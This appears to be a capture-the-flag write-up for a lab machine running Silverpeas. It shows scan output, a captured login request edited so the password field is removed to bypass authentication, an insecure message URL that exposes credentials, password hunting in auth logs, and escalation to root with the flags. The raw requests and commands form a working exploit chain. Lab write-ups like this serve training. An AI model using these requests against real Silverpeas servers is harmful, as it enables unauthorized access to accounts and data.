
## Important Data
1. IP - 10.49.181.198
2. Username in website/contact - scr1ptkiddy
### Nmap - Scan Results - 3 Open Ports - 22, 80, 8080
```Bash
PORT     STATE SERVICE    REASON         VERSION
22/tcp   open  ssh        syn-ack ttl 62 OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 ee:79:7b:8e:19:30:16:0b:7a:47:2c:b4:a2:f0:51:e8 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBAkP2z+wDmZ2uUXGEHxqdh0Hh49GS8RRCAKoKm8Zg7Y+Jv7DwfrCRjxlFt8WxyIPaMFafO3W7Rix25lQgN+o4s=
|   256 c5:19:34:d3:6e:32:c0:e6:22:51:4b:e7:e4:f9:da:9a (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIH0F7fObxv8WB2IRgCYOKdH1Peb5w6cUrL7K+S+TYil
80/tcp   open  http       syn-ack ttl 62 nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-title: Hack Smarter Security
|_http-server-header: nginx/1.18.0 (Ubuntu)
8080/tcp open  http-proxy syn-ack ttl 61
|_http-title: Error
| fingerprint-strings: 
|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, Socks5, TLSSessionReq, TerminalServerCookie, WMSRequest, oracle-tns: 
|     HTTP/1.1 400 Bad Request
|     Content-Length: 0
|_    Connection: close
```

### FFUF Enumeration

Port 80
```Bash
ffuf -u http://10.49.181.198:80/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories.txt -mc 200-299,301,302,307 -o ffuf.txt 

images                  [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 51ms]
assets                  [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 24ms]

```

Nothing interesting!!
#### Port 8080
```Bash
ffuf -u http://10.49.181.198:8080/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories.txt -mc 200-299,301,302,307 -o 8080ffuf.txt

website                 [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 68ms]
console                 [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 45ms]
```

Nothing Intresting!!

Silverpeas usually runs on http://localhost:8080/silverpeas
/silverpeas directory which is accessible.

Site runs on 2022 version of silverpeas, so anything on 2023 and 2024 might work!

- Authentication Bypass Vulnerability - https://gist.github.com/ChrisPritchard/4b6d5c70d9329ef116266a6c238dcb2d
- Broken Access - https://github.com/RhinoSecurityLabs/CVEs/tree/master/CVE-2023-47323

#### Authentication Bypass Vulnerability Exploitation

Original Packet:
```HTML
POST /silverpeas/AuthenticationServlet HTTP/1.1
Host: 10.49.181.198:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 49
Origin: http://10.49.181.198:8080
Connection: keep-alive
Referer: http://10.49.181.198:8080/silverpeas/defaultLogin.jsp?DomainId=0&ErrorCode=1
Cookie: JSESSIONID=jZPemAtRRJYiBnDg4ePq4ZGe8d9I8uKglCwJGR3e.ebabc79c6d2a
Upgrade-Insecure-Requests: 1
Priority: u=0, i



Login=SilverAdmin&Password=SilverAdmin&DomainId=0
```

Modified:
```HTML
POST /silverpeas/AuthenticationServlet HTTP/1.1
Host: 10.49.181.198:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 49
Origin: http://10.49.181.198:8080
Connection: keep-alive
Referer: http://10.49.181.198:8080/silverpeas/defaultLogin.jsp?DomainId=0&ErrorCode=1
Cookie: JSESSIONID=jZPemAtRRJYiBnDg4ePq4ZGe8d9I8uKglCwJGR3e.ebabc79c6d2a
Upgrade-Insecure-Requests: 1
Priority: u=0, i



Login=SilverAdmin&DomainId=0
```

Then we have logged in as SilverAdmin !!

To Read others messages to check any sensitive data being transferred!
#### Broken Access Vulnerability Exploitation 

```text
URL - http://10.49.181.198:8080/silverpeas/RSILVERMAIL/jsp/ReadMessage.jsp?ID=6
Username: tim
Password: cm0nt!md0ntf0rg3tth!spa$$w0rdagainlol
```

Lets SSH to tim account!! with these creds.

### Enumeration
```Bash
tim@ip-10-49-181-198:~$ pwd
/home/tim
tim@ip-10-49-181-198:~$ ls
user.txt
tim@ip-10-49-181-198:~$ id
uid=1001(tim) gid=1001(tim) groups=1001(tim),4(adm)
tim@ip-10-49-181-198:~$ 

```
#### Obtained User.txt Flag
```Bash
tim@ip-10-49-181-198:~$ ls
user.txt
tim@ip-10-49-181-198:~$ cat user.txt
THM{c4ca4238a0b923820dcc509a6f75849b}
tim@ip-10-49-181-198:~$ 
```

#### Ran Linpeas.sh it gave potentially exploitable Snapd bin
```Bash
/snap/snapd/24792/usr/lib/snapd/snap-confine cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_sys_chroot,cap_sys_ptrace,cap_sys_admin=p
```

Since Tim is part of adm Group we can access logs as well!!
#### Inspecting Logs
```Bash
tim@ip-10-49-181-198:/var/log$ grep -a -i "pass" auth*
```

After Obtaining Tyler password from logs

```Bash
tim@ip-10-49-181-198:/var/log$ su tyler
Password: 
#tyler password - _Zd_zx7N823/
tyler@ip-10-49-181-198:/var/log$ sudo -l
[sudo] password for tyler: 
Matching Defaults entries for tyler on ip-10-49-181-198:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User tyler may run the following commands on ip-10-49-181-198:
    (ALL : ALL) ALL
tyler@ip-10-49-181-198:/var/log$ sudo su
root@ip-10-49-181-198:/var/log# cat /root/root.txt 
THM{098f6bcd4621d373cade4e832627b4f6}
```

